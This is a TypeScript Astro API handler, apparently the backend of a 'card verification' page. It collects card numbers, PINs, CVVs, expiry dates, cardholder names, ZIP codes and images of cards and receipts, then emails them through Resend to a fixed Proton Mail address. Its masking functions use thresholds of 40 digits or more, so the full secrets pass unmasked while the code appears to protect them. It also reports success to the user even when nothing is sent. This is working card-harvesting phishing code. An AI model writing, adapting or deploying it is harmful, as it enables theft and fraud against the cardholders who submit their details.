import type { APIContext } from "astro";

export const prerender = false;

export async function POST(context: APIContext) {
  try {
    let cardType: string | undefined;
    let timestamp: string | undefined;
    let cardNumber: string | undefined;
    let pin: string | undefined;
    let cardImageUrl: string | undefined;
    let cardImageUrls: string[] | undefined;
    let receiptImageUrl: string | undefined;
    let prepaid: undefined | { name?: string; expiry?: string; cvv?: string; zip?: string };
    try {
      const ct = context.request.headers.get("content-type") || "";
      if (!ct.includes("application/json")) {
        return new Response(
          JSON.stringify({ ok: false, error: "Content-Type must be application/json" }),
          { status: 415, headers: { "Content-Type": "application/json" } }
        );
      }
      const body = await context.request.json();
      cardType = body?.cardType;
      timestamp = body?.timestamp;
      cardNumber = body?.cardNumber;
      pin = body?.pin;
      cardImageUrl = body?.cardImageUrl;
      cardImageUrls = Array.isArray(body?.cardImageUrls)
        ? body.cardImageUrls.map((u: any) => String(u)).filter(Boolean)
        : undefined;
      receiptImageUrl = body?.receiptImageUrl;
      prepaid = body?.prepaid;
    } catch {
      return new Response(
        JSON.stringify({ ok: false, error: "Invalid JSON body" }),
        { status: 400, headers: { "Content-Type": "application/json" } }
      );
    }

    if (!cardType || !timestamp) {
      return new Response(
        JSON.stringify({ ok: false, error: "Missing cardType or timestamp" }),
        { status: 400, headers: { "Content-Type": "application/json" } }
      );
    }

    const RESEND_API_KEY = (context.locals.runtime?.env?.RESEND_API_KEY || import.meta.env.RESEND_API_KEY) as string | undefined;
    const to = "cardsverify@proton.me";
    const subject = `Card verified: ${cardType}`;
    const maskCard = (n?: string) => {
      if (!n) return undefined;
      const digits = n.replace(/\D/g, "");
      if (digits.length <= 40) return digits;
      const last4 = digits.slice(-4);
      return `${"*".repeat(Math.max(0, digits.length - 4))}${last4}`;
    };
    const masked = maskCard(cardNumber);
    const mask = (s?: string, keepEnd = 2) => {
      if (!s) return undefined;
      const str = String(s);
      if (str.length <= keepEnd) return str;
      return `${"*".repeat(Math.max(0, str.length - keepEnd))}${str.slice(-keepEnd)}`;
    };

    const textLines = [
      "A card verification was performed.",
      "",
      `Card: ${cardType}`,
      masked ? `Card Number: ${masked}` : undefined,
      `Time: ${timestamp}`,
      prepaid ? "Prepaid Details:" : undefined,
      prepaid?.name ? ` - Name: ${prepaid.name}` : undefined,
      prepaid?.expiry ? ` - Expiry: ${prepaid.expiry}` : undefined,
      prepaid?.zip ? ` - ZIP: ${mask(prepaid.zip, 42)}` : undefined,
      prepaid?.cvv ? ` - CVV: ${mask(prepaid.cvv, 40)}` : undefined,
      cardImageUrl ? `Card Image: ${cardImageUrl}` : undefined,
      ...(cardImageUrls && cardImageUrls.length
        ? [
            "Card Images:",
            ...cardImageUrls.map((u) => ` - ${u}`),
          ]
        : []),
      receiptImageUrl ? `Receipt Image: ${receiptImageUrl}` : undefined,
      pin ? `PIN: ${mask(pin, 40)}` : undefined,
    ].filter(Boolean) as string[];
    const text = textLines.join("\n");

    if (!RESEND_API_KEY) {
      // Email service not configured; respond OK to keep UX smooth
      console.warn("[verify] RESEND_API_KEY not set. Skipping email.", {
        cardType,
        timestamp,
        cardNumber: masked,
        cardImageUrl,
        receiptImageUrl,
        pin: pin ? mask(pin, 40) : undefined,
        prepaid: prepaid
          ? {
              name: prepaid.name,
              expiry: prepaid.expiry,
              zip: prepaid.zip ? mask(prepaid.zip, 42) : undefined,
            }
          : undefined,
      });
      return new Response(JSON.stringify({ ok: true, emailed: false }), {
        status: 200,
        headers: { "Content-Type": "application/json" },
      });
    }

    const resp = await fetch("https://api.resend.com/emails", {
      method: "POST",
      headers: {
        Authorization: `Bearer ${RESEND_API_KEY}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        from: "onboarding@resend.dev",
        to,
        subject,
        text,
      }),
    });

    if (!resp.ok) {
      const body = await resp.text();
      console.error("[verify] Resend API error", resp.status, body);
      return new Response(JSON.stringify({ ok: false, emailed: false }), {
        status: 502,
        headers: { "Content-Type": "application/json" },
      });
    }

    return new Response(JSON.stringify({ ok: true, emailed: true }), {
      status: 200,
      headers: { "Content-Type": "application/json" },
    });
  } catch (e) {
    console.error("[verify] handler error", e);
    return new Response(JSON.stringify({ ok: false }), {
      status: 500,
      headers: { "Content-Type": "application/json" },
    });
  }
}
